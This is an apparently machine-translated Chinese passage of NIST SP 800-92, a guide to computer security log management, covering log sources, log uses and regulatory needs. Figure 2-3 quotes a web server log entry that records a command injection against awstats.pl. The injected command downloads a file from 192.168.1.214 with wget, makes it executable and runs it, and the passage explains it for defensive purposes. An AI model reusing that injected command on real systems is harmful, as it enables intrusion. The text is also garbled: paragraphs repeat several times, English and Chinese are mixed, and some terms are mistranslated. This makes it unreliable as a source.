特別出版物 800-92 Guide to Computer Security Log Management Recommendations of the National Institute of Standards and Technology Karen Kent Murugiah Souppaya

計算機安全日誌管理指南 計算機系統技術報告 美國國家標準與技術研究院 (NIST) 的信息技術實驗室 (ITL) 通過為國家的測量和標準基礎設施提供技術領導來促進美國經濟和公共福利。ITL 開發測試、測試方法、參考數據、概念實施證明和技術分析，以促進信息技術的開發和生產使用。ITL 的職責包括制定技術、物理、行政和管理標準和指南，以確保聯邦計算機系統中敏感非機密信息的安全性和隱私性具有成本效益。本特別出版物 800 系列報告了 ITL 的研究、指導、計算機安全方面的外展工作及其與行業、政府和學術組織的合作活動。本文檔中可能會標識某些商業實體、設備或材料，以便充分描述實驗程序或概念。此類標識無意暗示美國國家標準與技術研究院的推薦或認可，也無意暗示實體、材料或設備一定是可用於此目的的最佳選擇。美國國家標準技術研究所特別出版物 800-92 Natl。研究所 站立。技術。規格 發布。800-92，72 頁（2006 年 9 月）ii 計算機安全日誌管理指南致謝美國國家標準與技術研究院 (NIST) 的作者 Karen Kent 和 Murugiah Souppaya，感謝審閱本文檔草稿並為其技術內容做出貢獻的同事，尤其是 NIST 的 Bill Burr、Elizabeth Chew、Tim Grance、Bill MacGregor、Stephen Quinn 和 Matthew Scholl，以及 Stephen Green、Joseph Nusbaum、Angela Orebaugh， Dennis Pickett 和 Booz Allen Hamilton 的 Steven Sharma。作者要特別感謝 LogLogic 的 Anton Chuvakin 和 Michael Gerdes 的仔細審閱以及為提高本出版物質量所做的許多貢獻。作者還要感謝微軟的安全專家 Kurt Dillard、Wells Fargo Bank 的 Dean Farrington、ArcSight 的 Raffael Marty、Neohapsis 的 Greg Shipley 和 Monterey Technology Group 的 Randy Smith，以及該部門的代表能源部，衛生與公眾服務部，國土安全部、國務院、財政部、環境保護署、美國國立衛生研究院和社會保障管理局提出寶貴意見和建議。商標 所有名稱均為其各自公司的註冊商標或商標。iii 計算機安全日誌管理指南目錄執行摘要................................................ ..................................................... ......................ES-1 商標 所有名稱均為其各自公司的註冊商標或商標。iii 計算機安全日誌管理指南目錄執行摘要................................................ ..................................................... ......................ES-1 商標 所有名稱均為其各自公司的註冊商標或商標。iii 計算機安全日誌管理指南目錄執行摘要................................................ ..................................................... ......................ES-1

介紹 ................................................. ..................................................... ..................... 1-1 1.1 權限................................ ..................................................... ..................................... 1-1 1.2 目的和範圍 ..................... ..................................................... ..................................... 1-1 1.3 觀眾 ..................... ..................................................... ..................................................... . 1-1 1.4 出版結構................................................ ..................................................... 1-1
計算機安全日誌管理簡介................................................................ .... 2-1 2.1 計算機安全日誌基礎................................................. ..................................... 2-1 2.1.1 安全軟件 ..................... ..................................................... ..................................... 2-2 2.1.2 操作系統 ..................... ..................................................... ...................... 2-4 2.1.3 應用................................. ..................................................... ...................................... 2-4 2.1.4 日誌的有用性................................. ..................................................... ..................... 2-6 2.2 日誌管理的必要性...................... ..................................................... . 2-7 2.3 日誌管理的挑戰..................................................................................................... 2-8 2.3.1 日誌生成與存儲 ..................... ..................................................... ...................... 2-8 2.3.2 日誌保護................................. ..................................................... ...................... 2-9 2.3.3 日誌分析................................. ..................................................... ................................ 2-10 2.4 迎接挑戰 ............................................... ..................................................... ...... 2-10 2.5 小結................................................ ..................................................... ...................... 2-11..................................... 2-9 2.3.3 日誌分析...................................... ..................................................... ..................................... 2-10 2.4 迎接挑戰...................................... ..................................................... ..................... 2-10 2.5 總結................................ ..................................................... ..................................... 2-11..................................... 2-9 2.3.3 日誌分析...................................... ..................................................... ..................................... 2-10 2.4 迎接挑戰...................................... ..................................................... ..................... 2-10 2.5 總結................................ ..................................................... ..................................... 2-11
日誌管理基礎設施...................................................... ..................................... 3-1 3.1 架構 ..................... ..................................................... ..................................... 3- 1 3.2 功能...................................................... ..................................................... ..................... 3-3 3.3 基於 Syslog 的集中式日誌記錄軟件...................................... ................................... 3-5 3.3.1 系統日誌格式 ............................................... ..................................................... ..................................... 3-5 3.3.2 系統日誌安全 ..................... ..................................................... ..................................... 3-7 3.4 安全信息和事件管理軟件 ..................... ..................................... 3-9 3.5 其他類型的日誌管理軟件................................................................ ...................... 3-10 3.6 小結...................................... ..................................................... ...................... 3-11
日誌管理計劃...................................................... ................................................... 4-1 4.1 定義角色和職責................................................................ ................................... 4-1 4.2 建立日誌記錄策略................................ ..................................................... ................................................ 4-3 4.3 確保政策切實可行................................................ ..................................................... 4-7 4.4 設計日誌管理基礎設施................................................. ..................................... 4-9 4.5 總結................................ ..................................................... ..................................... 4-10
..................................................... .....A-1 附錄 B——縮略語 ............................................... ..................................................... ...................B-1 附錄 C— 工具和資源................................ ..................................................... .........C-1 附錄 D— 索引 ................................... ..................................................... .....................................D-1 圖表圖 2-1。安全軟件日誌條目示例 ............................................................... ...................... 2-3 圖 2-2。操作系統日誌條目示例 ............................................................... ...................... 2-4 圖 2-3。Web 服務器日誌條目示例 ............................................................... ..................................... 2-6 圖 3-1。Syslog 消息的示例...................... ..................................................... ................... 3-6 表格清單 表 4-1。日誌記錄配置設置示例................................................................ ........................ 4-6 v 計算機安全日誌管理指南 此頁已特意留空。vi 計算機安全日誌管理指南 執行摘要 日誌是組織系統和網絡中發生的事件的記錄。日誌由日誌條目組成；每個條目都包含與系統或網絡中發生的特定事件相關的信息。組織內的許多日誌包含與計算機安全相關的記錄。這些計算機安全日誌由許多來源生成，包括安全軟件，例如防病毒軟件、防火牆以及入侵檢測和預防系統；服務器、工作站和網絡設備上的操作系統；和應用程序。計算機安全日誌的數量、體積和種類都大大增加，這就產生了對計算機安全日誌管理的需求——計算機安全日誌數據的產生、傳輸、存儲、分析和處置的過程。日誌管理對於確保在適當的時間段內足夠詳細地存儲計算機安全記錄至關重要。例行日誌分析有利於識別安全事件、策略違規、欺詐活動和操作問題。在執行審計和取證分析、支持內部調查、建立基線以及識別運營趨勢和長期問題時，日誌也很有用。組織還可以存儲和分析某些日誌以遵守聯邦立法和法規，包括 2002 年聯邦信息安全管理法案 (FISMA)、1996 年健康保險流通和責任法案 (HIPAA)、2002 年薩班斯-奧克斯利法案 ( SOX)、Gramm-Leach-Bliley 法案 (GLBA) 和支付卡行業數據安全標準 (PCI DSS)。許多組織中出現的日誌管理的一個基本問題是如何有效地平衡有限數量的日誌管理資源與持續提供的日誌數據。日誌生成和存儲可能會因多種因素而變得複雜，包括大量的日誌源；來源之間的日誌內容、格式和時間戳不一致；以及越來越大的日誌數據量。日誌管理還涉及保護機密性，日誌的完整性和可用性。日誌管理的另一個問題是確保安全、系統和網絡管理員定期對日誌數據進行有效分析。本出版物提供了應對這些日誌管理挑戰的指南。實施以下建議應有助於促進聯邦部門和機構更高效和有效的日誌管理。組織應該建立日誌管理的策略和程序。為了建立和維護成功的日誌管理活動，組織應該開發執行日誌管理的標準流程。作為規劃過程的一部分，組織應該定義其日誌記錄要求和目標。基於這些，然後，組織應制定明確定義強制性要求的政策，並為日誌管理活動提出建議，包括日誌生成、傳輸、存儲、分析和處置。組織還應確保相關政策和程序包含並支持日誌管理要求和建議。組織的管理層應該為涉及日誌管理規劃、策略和程序開發的工作提供必要的支持。日誌記錄的要求和建議應結合對實施和維護它們所需的技術和資源的詳細分析、它們的安全影響和價值以及組織所遵守的法規和法律（例如 FISMA、HIPAA、硫氧化物）。一般來說，組織應該要求記錄和分析最重要的數據，並且如果時間和資源允許，還應該記錄和分析其他類型和來源的數據的非強制性建議。在某些情況下，組織選擇生成所有或幾乎所有日誌數據並至少在短時間內存儲以備不時之需，這有利於安全性 ES-1 計算機安全日誌管理指南考慮可用性和資源使用，在某些情況下還可以做出更好的決策。在建立要求和建議時，組織應該努力保持靈活性，因為每個系統都是不同的，並且會記錄與其他系統不同的數據量。組織的政策和程序還應解決原始日誌的保存問題。許多組織將網絡流量日誌的副本發送到集中式設備，並使用分析和解釋網絡流量的工具。在可能需要日誌作為證據的情況下，組織可能希望獲取原始日誌文件、集中日誌文件和解釋的日誌數據的副本，以防對複制和解釋過程的保真度有任何疑問。保留日誌作為證據可能涉及使用不同形式的存儲和不同過程，例如對訪問記錄的額外限制。組織應該在整個組織中適當地優先考慮日誌管理。在組織定義了日誌管理過程的要求和目標之後，然後，它應該根據組織感知到的風險降低以及執行日誌管理功能所需的預期時間和資源來確定需求和目標的優先級。組織還應該為整個組織的關鍵人員定義日誌管理的角色和職責，包括在單個系統級別和日誌管理基礎架構級別建立日誌管理職責。組織應該創建和維護日誌管理基礎設施。日誌管理基礎設施由用於生成、傳輸、存儲、分析和處置日誌數據的硬件、軟件、網絡和媒體組成。日誌管理基礎設施通常執行多項支持日誌數據分析和安全性的功能。在建立初始日誌管理策略並確定角色和職責之後，組織接下來應該開發一個或多個日誌管理基礎架構來有效支持該策略和角色。組織應考慮實施包括集中式日誌服務器和日誌數據存儲在內的日誌管理基礎設施。在設計基礎架構時，組織應針對整個組織中基礎架構和各個日誌源的當前和未來需求進行規劃。設計中要考慮的主要因素包括要處理的日誌數據量、網絡帶寬、在線和離線數據存儲、數據的安全要求以及人員分析日誌所需的時間和資源。組織應為所有負有日誌管理責任的員工提供適當的支持。為確保在整個組織內有效地執行單個系統的日誌管理，這些系統的管理員應該得到足夠的支持。這應包括傳播信息、提供培訓、指定聯繫人回答問題、提供具體技術指導以及提供工具和文檔。組織應建立標準的日誌管理操作流程。主要的日誌管理操作流程通常包括配置日誌源、執行日誌分析、啟動對已識別事件的響應以及管理長期存儲。管理員還有其他責任，例如：� 監控所有日誌源的日誌記錄狀態 � 監控日誌輪轉和歸檔過程 ES-2 計算機安全日誌管理指南 � 檢查日誌軟件的升級和補丁，並獲取、測試和部署它們 � 確保每個日誌主機的時鐘與公共時間源同步 根據策略更改、技術更改和其他因素根據需要重新配置日誌記錄 記錄和報告日誌設置、配置和流程中的異常情況。ES-3 計算機安全日誌管理指南 此頁有意留空。ES-4 計算機安全日誌管理指南 並部署它們 確保每個日誌記錄主機的時鐘同步到一個公共時間源 根據策略更改、技術更改和其他因素根據需要重新配置日誌記錄 記錄和報告日誌設置、配置和流程中的異常情況。ES-3 計算機安全日誌管理指南 此頁有意留空。ES-4 計算機安全日誌管理指南 並部署它們 確保每個日誌記錄主機的時鐘同步到一個公共時間源 根據策略更改、技術更改和其他因素根據需要重新配置日誌記錄 記錄和報告日誌設置、配置和流程中的異常情況。ES-3 計算機安全日誌管理指南 此頁有意留空。ES-4 計算機安全日誌管理指南
簡介 1.1 授權 美國國家標準與技術研究院 (NIST) 制定本文件是為了履行其在 2002 年聯邦信息安全管理法案 (FISMA) 公法 107-347 下的法定職責。NIST 負責制定標準和指南，包括最低要求，為所有機構運營和資產提供足夠的信息安全；但此類標準和指南不適用於國家安全系統。本指南符合管理和預算辦公室 (OMB) 通告 A-130 第 8b(3) 節“保護機構信息系統”的要求，如 A-130 附錄 IV：關鍵部分分析中所分析。補充信息在 A-130 的附錄 III 中提供。本指南已準備好供聯邦機構使用。它可以由非政府組織自願使用，不受版權保護，但需要署名。本文件中的任何內容均不應與商務部長根據法定權力對聯邦機構制定的強制性和約束力標準和指南相抵觸，也不應將這些指南解釋為改變或取代商務部長、商務部主任的現有權限OMB 或任何其他聯邦官員。1.2 目的和範圍本出版物旨在幫助組織了解健全的計算機安全日誌管理的必要性。它提供了有關在整個企業中開發、實施和維護有效日誌管理實踐的實用、真實的指南。本出版物中的指南涵蓋多個主題，包括建立日誌管理基礎設施，以及在整個組織內開發和執行強大的日誌管理流程。該出版物從高層次的角度介紹了日誌管理技術，而不是實施或使用日誌管理技術的分步指南。1.3 讀者 本出版物專為計算機安全人員和項目經理編寫；系統、網絡和應用程序管理員；計算機安全事件響應團隊；以及其他負責執行計算機安全日誌管理相關職責的人。1.4 出版物結構 本出版物的其餘部分分為四個主要部分。第 2 節介紹了計算機安全日誌管理，包括對組織可能具有的日誌管理需求的解釋以及日誌管理所涉及的挑戰。第 3 節討論了日誌管理基礎設施的組件、架構和功能。第 4 節提供了規劃日誌管理的建議，例如定義角色和職責以及創建可行的日誌記錄策略。第 5 節解釋了組織應該為日誌管理操作開發和執行的過程。該出版物還包含幾個帶有支持材料的附錄。附錄 A 和 B 分別包含詞彙表和首字母縮略詞列表。附錄 C 列出了工具以及在線和印刷資源，這些資源是 1-1 計算機安全日誌管理指南 有助於更好地了解日誌管理的有用參考。附錄 D 包含該出版物的索引。
計算機安全日誌管理簡介 日誌是組織系統和網絡中發生的事件的記錄。日誌由日誌條目組成；每個條目都包含與系統或網絡中發生的特定事件相關的信息。最初，日誌主要用於解決問題，但現在日誌在大多數組織中具有許多功能，例如優化系統和網絡性能、記錄用戶的操作以及提供對調查惡意活動有用的數據。日誌已經發展到包含與網絡和系統中發生的許多不同類型的事件相關的信息。在一個組織內部，許多日誌包含與計算機安全相關的記錄；這些計算機安全日誌的常見示例是跟踪用戶身份驗證嘗試的審計日誌和記錄可能的攻擊的安全設備日誌。本指南僅針對那些通常包含計算機安全相關信息的日誌。1 由於網絡服務器、工作站和其他計算設備的廣泛部署，以及針對網絡和系統的威脅數量不斷增加，數量、數量、計算機安全日誌的種類大大增加。這就產生了計算機安全日誌管理的需求，即計算機安全日誌數據的產生、傳輸、存儲、分析和處置的過程。本文檔的這一部分討論了計算機安全日誌管理的需求和挑戰。2.1 節解釋了計算機安全日誌的基礎知識。第 2.2 節討論了與日誌管理相關的法律、法規和操作需求。第 2.3 節解釋了最常見的日誌管理挑戰，第 2.4 節提供了應對這些挑戰的高級建議。2.1 計算機安全日誌的基礎知識日誌可以包含有關係統和網絡中發生的事件的各種信息。 2
本節介紹以下特別感興趣的日誌類別： 安全軟件日誌主要包含與計算機安全相關的信息。2.1.1 節描述了它們。� 操作系統日誌（在第 2.1.2 節中描述）和應用程序日誌（在第 2.1.3 節中描述）通常包含各種信息，包括與計算機安全相關的數據。在不同的情況下，組織內創建的許多日誌可能與計算機安全有一定的相關性。例如，來自交換機和無線接入點等網絡設備以及網絡監控軟件等程序的日誌可能會記錄可用於計算機安全或其他信息技術 (IT) 計劃（如運營和審計）的數據，以及證明遵守法規。然而，為了計算機安全，這些日誌通常根據需要用作補充信息來源。本文檔重點介紹組織在計算機安全方面最常認為重要的日誌類型。在設計和實施日誌管理基礎架構時，組織應考慮計算機安全日誌數據的每個潛在來源的價值。日誌條目的大部分來源都是連續運行的，因此它們會持續生成條目。但是，某些來源會定期運行，因此它們通常會定期定期生成條目。在設計和實施日誌管理基礎架構時，組織應考慮計算機安全日誌數據的每個潛在來源的價值。日誌條目的大部分來源都是連續運行的，因此它們會持續生成條目。但是，某些來源會定期運行，因此它們通常會定期定期生成條目。在設計和實施日誌管理基礎架構時，組織應考慮計算機安全日誌數據的每個潛在來源的價值。日誌條目的大部分來源都是連續運行的，因此它們會持續生成條目。但是，某些來源會定期運行，因此它們通常會定期定期生成條目。

1 對於本文檔的其餘部分，術語“日誌”和“計算機安全日誌”可以互換，除非另有說明。2 如果日誌包含個人身份信息——可用於識別個人身份的信息，例如社會安全號碼——組織應確保日誌信息的隱私得到適當保護。作為日誌管理計劃的一部分，應諮詢負責組織隱私的人員。2-1 計算機安全日誌管理指南 本節說明以批處理模式工作的所有日誌源，因為這可能對其日誌在事件響應和其他時間敏感工作中的有用性產生重大影響。2.1.1

安全軟件 大多數組織使用多種類型的基於網絡和基於主機的安全軟件來檢測惡意活動、保護系統和數據並支持事件響應工作。因此，安全軟件是計算機安全日誌數據的主要來源。基於網絡和基於主機的安全軟件的常見類型包括： 反惡意軟件。最常見的反惡意軟件形式是反病毒軟件，它通常會記錄檢測到的惡意軟件、文件和系統殺毒嘗試以及文件隔離的所有實例。3 此外，反病毒軟件還可能會記錄執行惡意軟件掃描的時間以及反病毒簽名或軟件更新的時間發生。反間諜軟件和其他類型的反惡意軟件（例如，rootkit 檢測器）也是安全信息的常見來源。� 入侵檢測和入侵防禦系統。入侵檢測和入侵防禦系統記錄有關可疑行為和檢測到的攻擊的詳細信息，以及入侵防禦系統為阻止正在進行的惡意活動而執行的任何操作。一些入侵檢測系統，例如文件完整性檢查軟件，會定期運行而不是連續運行，因此它們會批量生成日誌條目，而不是持續生成日誌條目。4 � 遠程訪問軟件。遠程訪問通常是通過虛擬專用網絡 (VPN) 授予和保護的。VPN 系統通常會記錄成功和失敗的登錄嘗試，以及每個用戶連接和斷開連接的日期和時間，以及每個用戶會話中發送和接收的數據量。支持精細訪問控制的 VPN 系統，例如許多安全套接字層 (SSL) VPN，可能會記錄有關資源使用的詳細信息。� 網絡代理。Web 代理是訪問網站的中間主機。Web 代理代表用戶發出網頁請求，並且它們緩存檢索到的網頁的副本，以便更有效地對這些頁面進行其他訪問。Web 代理也可用於限制 Web 訪問並在 Web 客戶端和 Web 服務器之間添加一層保護。Web 代理通常會記錄通過它們訪問的所有 URL。� 漏洞管理軟件。漏洞管理軟件包括補丁管理軟件和漏洞評估軟件，通常會記錄每個主機的補丁安裝歷史和漏洞狀態，其中包括已知漏洞和缺失的軟件更新。5 漏洞管理軟件還可能記錄有關主機配置的其他信息。漏洞管理軟件通常偶爾運行，而不是連續運行，並且可能會生成大量日誌條目。認證服務器。身份驗證服務器（包括目錄服務器和單點登錄服務器）通常會記錄每次身份驗證嘗試，包括其來源、用戶名、成功或失敗以及日期和時間。3 有關防病毒軟件的更多信息，請參閱 NIST SP 800-83，惡意軟件事件預防和處理指南。該出版物可在 身份驗證服務器（包括目錄服務器和單點登錄服務器）通常會記錄每次身份驗證嘗試，包括其來源、用戶名、成功或失敗以及日期和時間。3 有關防病毒軟件的更多信息，請參閱 NIST SP 800-83，惡意軟件事件預防和處理指南。該出版物可在 身份驗證服務器（包括目錄服務器和單點登錄服務器）通常會記錄每次身份驗證嘗試，包括其來源、用戶名、成功或失敗以及日期和時間。3 有關防病毒軟件的更多信息，請參閱 NIST SP 800-83，惡意軟件事件預防和處理指南。該出版物可在http://csrc nist.gov/publications/nistpubs/。4 有關入侵檢測系統的更多信息，請參閱 NIST SP 800-94（草案），入侵檢測和預防系統指南，可從http://csrc nist.gov/publications/nistpubs/ 獲取。5 NIST SP 800-40 第 2 版，創建補丁和漏洞管理程序，包含漏洞管理軟件指南。SP 800-40 第 2 版可從http://csrc下載nist.gov/publications/nistpubs/。2-2 計算機安全日誌管理指南 路由器。路由器可以配置為根據策略允許或阻止某些類型的網絡流量。阻止流量的路由器通常配置為僅記錄被阻止活動的最基本特徵。防火牆。像路由器一樣，防火牆根據策略允許或阻止活動；但是，防火牆使用更複雜的方法來檢查網絡流量。6 防火牆還可以跟踪網絡流量的狀態並執行內容檢查。與路由器相比，防火牆往往具有更複雜的策略並生成更詳細的活動日誌。� 網絡隔離服務器。一些組織在允許每個遠程主機加入網絡之前檢查其安全狀況。這通常是通過網絡隔離服務器和放置在每台主機上的代理來完成的。不響應服務器檢查或未通過檢查的主機將被隔離在單獨的虛擬局域網 (VLAN) 網段中。網絡隔離服務器記錄有關檢查狀態的信息，包括哪些主機被隔離以及出於什麼原因。圖 2-1 包含幾個安全軟件日誌條目示例。7 入侵檢測系統 [] [1:1407:9] SNMP 陷阱 udp [] [分類：企圖信息洩露] [優先級：2] 03/06-8:14:09.082119 192.168.1.167:1052 -> 172.30.128.27:162 UDP TTL:118 TOS:0x0 ID:29101 IpLen:20 DgmLen:87個人防火牆 3/6/2006 8:14:07 AM,"規則""阻止 Windows 文件共享""已阻止（192.168.1.54, netbios-ssn(139))","規則""阻止 Windows 文件共享"" blocked (192.168.1.54, netbios-ssn(139)). Inbound TCP connection. Local address,service is (KENT(172.30.128.27),netbios-ssn(139)). Remote address,service is (192.168.1.54,39922) ). 進程名稱是“System”。3/3/2006 9:04:04 AM，防火牆配置更新：398 條規則。，防火牆配置更新：398 條規則。防病毒軟件，日誌 1 3/4/2006 9:33:50 AM，定義文件下載，KENT，userk，定義下載程序 3/4/2006 9:33:09 AM，AntiVirus Startup,KENT,userk,System 3/3/2006 3:56:46 PM,AntiVirus Shutdown,KENT,userk,System Antivirus Software, Log 2 240203071234,16,3,7,KENT,userk,,,,,, ,16777216,"病毒定義是最新的。",0,,0,,,,,0,,,,,,,,,SAVPROD,{ xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx },最終用戶,(IP )-192.168.1.121,,GROUP,0:0:0:0:0:0,9.0.0.338,,,,,,,,,,,,,, 反間諜軟件 DSO 漏洞利用：數據源對象利用（註冊表更改，什麼都沒做） HKEY_USERS\S1-5-19\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1004!=W=3 圖 2-1. 安全軟件日誌條目示例 (IP)-192.168.1.121,,GROUP,0:0:0:0:0:0,9.0.0.338,,,,,,,,,,,,,, 反間諜軟件DSO漏洞利用：數據源對象漏洞利用（改註冊表，什麼都沒做）HKEY_USERS\S1-5-19\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1004!=W=3 圖2-1。安全軟件日誌條目示例 (IP)-192.168.1.121,,GROUP,0:0:0:0:0:0,9.0.0.338,,,,,,,,,,,,,, 反間諜軟件DSO漏洞利用：數據源對象漏洞利用（改註冊表，什麼都沒做）HKEY_USERS\S1-5-19\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1004!=W=3 圖2-1。安全軟件日誌條目示例

6 有關防火牆的更多信息，請參閱 NIST 特別出版物 (SP) 800-41，防火牆和防火牆策略指南，可從以下網址下載：http: //csrc.nist.gov/publications/nistpubs/. 7 本出版物中的部分日誌示例已經過清理，以刪除 Internet 協議 (IP) 地址和其他識別信息。2-3 計算機安全日誌管理指南 2.1.2 操作系統 服務器、工作站和網絡設備（例如路由器、交換機）的操作系統(OS) 通常記錄各種與安全相關的信息。最常見的安全相關操作系統數據類型如下： 系統事件。系統事件是由操作系統組件執行的操作操作，例如關閉系統或啟動服務。通常，會記錄失敗事件和最重要的成功事件，但許多操作系統允許管理員指定將記錄哪些類型的事件。為每個事件記錄的詳細信息也有很大差異；每個事件通常都有時間戳，和其他支持信息可能包括事件、狀態和錯誤代碼；服務名稱; 與事件關聯的用戶或系統帳戶。� 審計記錄。審計記錄包含安全事件信息，例如成功和失敗的身份驗證嘗試、文件訪問、安全策略更改、帳戶更改（例如，帳戶創建和刪除、帳戶權限分配）以及權限的使用。操作系統通常允許系統管理員指定應審核哪些類型的事件，以及是否應記錄執行某些操作的成功和/或失敗嘗試。操作系統日誌還可能包含來自安全軟件和系統上運行的其他應用程序的信息。第 2.1.3 節提供了有關應用程序日誌數據的更多信息。操作系統日誌最有利於識別或調查涉及特定主機的可疑活動。在安全軟件識別出可疑活動後，通常會查閱操作系統日誌以獲取有關該活動的更多信息。例如，網絡安全設備可能會檢測到針對特定主機的攻擊；該主機的操作系統日誌可能表明用戶在攻擊時是否登錄到主機以及攻擊是否成功。許多操作系統日誌以 syslog 格式創建；3.3 節詳細討論了 syslog 並提供了 syslog 日誌條目的示例。其他操作系統日誌（例如 Windows 系統上的日誌）以專有格式存儲。圖 2-2 給出了從 Windows 安全日誌​​導出的日誌數據示例。事件類型：成功審核事件來源：安全事件類別：(1) 事件 ID：517 日期：2006 年 3 月 6 日時間：2:56：下午 40 點 用戶：NT AUTHORITY\SYSTEM 計算機：KENT 說明：審核日誌已清除 主要用戶名：SYSTEM 主要域：NT AUTHORITY 主要登錄 ID：(0x0,0x3F7) 客戶端用戶名：userk 客戶端域：KENT 客戶端登錄 ID： (0x0,0x28BFD) 圖 2-2。操作系統日誌條目示例 2.1.3 應用程序 操作系統和安全軟件為應用程序提供基礎和保護，這些應用程序用於存儲、訪問和操作用於組織業務流程的數據。大多數組織依賴於各種現成的商業 (COTS) 應用程序，例如電子郵件服務器和客戶端、Web 服務器和瀏覽器、文件服務器和文件共享客戶端以及數據庫服務器和客戶端。許多組織還使用各種 COTS 或政府現成 (GOTS) 業務 2-4 計算機安全日誌管理應用指南，例如供應鏈管理、財務管理、採購系統、企業資源規劃和客戶關係管理。除了 COTS 和 GOTS 軟件之外，大多數組織還使用根據其特定要求量身定制的定制開發應用程序。 8

一些應用程序生成自己的日誌文件，而其他應用程序則使用安裝它們的操作系統的日誌記錄功能。應用程序在它們記錄的信息類型方面有很大差異。下面列出了一些最常記錄的信息類型以及每種信息的潛在好處：9 � 客戶端請求和服務器響應，這對於重建事件序列和確定其明顯結果非常有幫助。如果應用程序記錄成功的用戶身份驗證，通常可以確定哪個用戶發出了每個請求。一些應用程序可以執行非常詳細的日誌記錄，例如電子郵件服務器記錄每封電子郵件的發件人、收件人、主題名稱和附件名稱；Web 服務器記錄每個請求的 URL 和服務器提供的響應類型；以及記錄每個用戶訪問了哪些財務記錄的業務應用程序。此信息可用於識別或調查事件，並出於合規性和審計目的監控應用程序使用情況。� 帳戶信息，例如成功和失敗的身份驗證嘗試、帳戶更改（例如，帳戶創建和刪除、帳戶權限分配）以及權限的使用。除了識別暴力密碼猜測和權限升級等安全事件外，它還可用於識別誰使用了該應用程序以及每個人何時使用它。� 使用信息，例如特定時間段（例如，分鐘、小時）內發生的交易數量和交易大小（例如，電子郵件消息大小、文件傳輸大小）。這對於某些類型的安全監控（例如。例如，電子郵件活動增加十倍可能表明存在新的電子郵件惡意軟件威脅；異常大的出站電子郵件可能表明信息發布不當）。� 重要的操作行為，例如應用程序啟動和關閉、應用程序故障和重大應用程序配置更改。這可用於識別安全威脅和操作故障。其中大部分信息，尤其是未通過未加密網絡通信使用的應用程序，只能由應用程序記錄，這使得應用程序日誌對於與應用程序相關的安全事件、審計和合規性工作特別有價值。然而，這些日誌通常採用專有格式，這使得它們更難使用，並且它們包含的數據通常高度依賴於上下文，需要更多資源來審查其內容。圖 2-3 包含來自 Web 服務器日誌的示例日誌條目，以及對條目中記錄的信息的解釋。

8 一個應用程序的單一實施也可以被多個組織使用。例如，上級組織可以託管其成員機構都使用的應用程序。機構使用應用程序的日誌很可能由上級組織管理，但每個機構也可能有能力查看其用戶的日誌信息。9 組織應考慮制定一項政策，為為其開發的自定義應用程序定義日誌記錄要求。這樣的策略有助於確保應用程序將記錄必要的信息以支持應用程序的安全性和對其使用的審計。2-5 計算機安全日誌管理指南 172.30.128.27 - - [14/Oct/2005:05:41:18 -0500] "GET /awstats/awstats.pl?config dir=|echo;echo%20YYY; cd%20%2ftmp%3bwget%20192%2e168%2e1%2e214%2fnikons%3bchmod%20%2bx% 20nikons%3b%2e%2fnikons;echo%20YYY;echo| HTTP/1.1" 302 494 172.30.128.27 發起請求的主機IP地址
表示信息不可用（此服務器未配置為在第二個字段中放置任何信息）
為 HTTP 身份驗證提供的用戶 ID；在這種情況下，未執行任何身份驗證 [14/Oct/2005:05:41:18 -0500] Web 服務器完成處理請求的日期和時間 GET HTTP 方法 /awstats/awstats.pl URL in the request config dir= |迴聲；迴聲%20YYY；cd%20%2ftmp%3bwget%20192%2e168%2e1%2e214%2fnikons%3bchmod%20%2bx%20nikons%3b%2e%2fnikons；迴聲%20YYY；迴聲| 請求的參數。每個 % 後跟兩個十六進製字符是 ASCII 字符的十六進制編碼。例如十六進制的20相當於十進制的32，ASCII字符32是一個空格；因此，%20 相當於一個空格。上面日誌條目的 ASCII 等效項如下所示。10 config dir=|echo;echo YYY;cd /tmp;wget 192.168.1.214/nikons;chmod +x nikons;/.nikons; 迴聲 YYY;迴聲| HTTP/1。1 用於發出請求的協議和協議版本 302 響應的狀態代碼；在 HTTP 協議標準中，代碼 302 對應於“found” 494 響應的大小（以字節為單位）圖 2-3。Web 服務器日誌條目示例 2.1.4

日誌的用途 第 2.1.1 節到第 2.1.3 節中描述的日誌類別通常包含不同類型的信息。因此，一些日誌通常比其他日誌更有可能記錄有助於不同情況的信息，例如檢測攻擊、欺詐和不當使用。對於 10 此日誌條目顯示惡意活動。攻擊試圖將一個名為“nikons”的文件從 IP 地址為 192.168.1.214 的主機傳輸到 Web 服務器，將文件設置為可執行文件，然後運行它，最有可能使用 Web 服務器的權限。2-6 計算機安全日誌管理指南 在每種情況下，某些日誌通常最有可能包含有關相關活動的詳細信息。其他日誌通常包含不太詳細的信息，並且通常只有助於關聯主要日誌類型中記錄的事件。例如，入侵檢測系統可以記錄從外部主機向服務器發出的惡意命令；這將是攻擊信息的主要來源。然後，事件處理程序可以查看防火牆日誌以查找來自同一源 IP 地址的其他連接嘗試；這將是攻擊信息的次要來源。使用日誌的管理員還應該注意每個日誌源的可信度。未適當保護的日誌源（包括不安全的傳輸機制）更容易受到日誌配置更改和日誌更改的影響。當然，管理員應該特別注意來自被攻擊成功的主機的日誌的準確性；檢查其他日誌通常也是謹慎的做法。2.2 日誌管理的需要 日誌管理可以使組織在很多方面受益。它有助於確保在適當的時間段內足夠詳細地存儲計算機安全記錄。例行日誌審查和分析有利於在安全事件、策略違規、欺詐活動和操作問題發生後立即識別它們，並有助於提供有助於解決此類問題的信息。日誌還可用於執行審計和取證分析、支持組織的內部調查、建立基線以及識別操作趨勢和長期問題。除了日誌管理的固有優勢外，許多法律法規進一步強制組織存儲和審查某些日誌。以下是有助於定義組織對日誌管理需求的關鍵法規、標準和指南的列表： 2002 年聯邦信息安全管理法案 (FISMA)。FISMA 強調每個聯邦機構都需要製定、記錄和實施組織範圍的計劃，為支持其運營和資產的信息系統提供信息安全。NIST SP 800-53，聯邦信息系統的推薦安全控制，是為支持 FISMA 而開發的。11 NIST SP 800-53 是聯邦機構推薦安全控制的主要來源。它描述了與日誌管理相關的幾種控制，包括審計記錄的生成、審查、保護和保留，以及因審計失敗而採取的行動。� Gramm-Leach-Bliley 法案 (GLBA)。12 GLBA 要求金融機構保護其客戶的信息免受安全威脅。日誌管理有助於識別可能的安全違規並有效解決它們。� 1996 年健康保險流通與責任法案 (HIPAA)。HIPAA 包括某些健康信息的安全標準。NIST SP 800-66，實施健康保險流通與責任法案 (HIPAA) 安全規則的介紹性資源指南，列出了與 HIPAA 相關的日誌管理需求。 13 